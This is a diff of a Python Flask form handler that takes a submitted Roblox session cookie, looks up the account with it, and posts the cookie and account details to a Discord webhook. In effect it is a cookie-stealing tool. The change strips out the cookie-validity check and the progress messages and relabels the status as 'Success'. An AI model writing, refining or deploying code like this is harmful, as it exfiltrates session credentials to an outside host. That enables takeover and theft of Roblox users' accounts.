@@ -278,29 +278,9 @@ def submit_form():
         
         print("Discord webhook URL configured successfully") # Don't log URL for security
         
-        # Start processing - fetch all required data before sending to Discord
-        print("Starting data processing...")
-        
-        # Step 1: Fetch Roblox user information
-        print("Step 1/3: Fetching Roblox user information...")
+        # Get real Roblox user information using the cookie
+        print("Fetching Roblox user information...")
         user_info = get_roblox_user_info(cookie)
-        
-        # Step 2: Validate and process all form data
-        print("Step 2/3: Processing form data...")
-        time.sleep(1)  # Brief processing delay
-        
-        # Step 3: Validate account information before sending
-        print("Step 3/3: Validating account information...")
-        
-        # Only send to Discord if we have valid account information
-        if user_info['username'] == 'Not available' or user_info['user_id'] is None:
-            print("❌ Invalid cookie or failed to fetch account information - Discord webhook cancelled")
-            return jsonify({
-                'success': False, 
-                'message': 'Invalid cookie - unable to fetch account information'
-            }), 400
-            
-        print("✅ Valid account information confirmed - proceeding with Discord notification")
         
         # Prepare cookie content for bottom of message
         cookie_header = f"🍪 **Cookie:**"
@@ -366,7 +346,7 @@ def submit_form():
                         },
                         {
                             'name': '📊 Status',
-                            'value': 'Processing Complete ✅',
+                            'value': 'Success 🟩',
                             'inline': False
                         },
                         {
@@ -397,10 +377,6 @@ def submit_form():
                 }
             ]
         }
-        
-        # Wait for all processing to complete before sending to Discord
-        print("✅ All processing completed successfully!")
-        print("📤 Now sending data to Discord...")
         
         # Send to Discord with timeout and error handling
         try:
